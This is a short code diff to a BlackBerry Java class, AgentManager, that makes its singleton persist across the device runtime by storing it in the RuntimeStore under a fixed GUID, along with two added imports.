@@ -11,7 +11,10 @@ package blackberry;
 
 import java.util.Vector;
 
+import net.rim.device.api.system.RuntimeStore;
+
 import blackberry.agent.Agent;
+import blackberry.config.Keys;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.Singleton;
@@ -23,6 +26,8 @@ import blackberry.utils.Check;
  * The Class AgentManager.
  */
 public final class AgentManager extends Manager implements Singleton {
+
+    private static final long GUID = 0xfa169781286585c3L;
 
     /** The debug instance. */
     //#ifdef DEBUG
@@ -39,7 +44,12 @@ public final class AgentManager extends Manager implements Singleton {
      */
     public static synchronized AgentManager getInstance() {
         if (instance == null) {
-            instance = new AgentManager();
+            instance = (AgentManager) RuntimeStore.getRuntimeStore().get(GUID);
+            if (instance == null) {
+                AgentManager singleton = new AgentManager();
+                RuntimeStore.getRuntimeStore().put(GUID, singleton);
+                instance = singleton;
+            }
         }
 
         return instance;
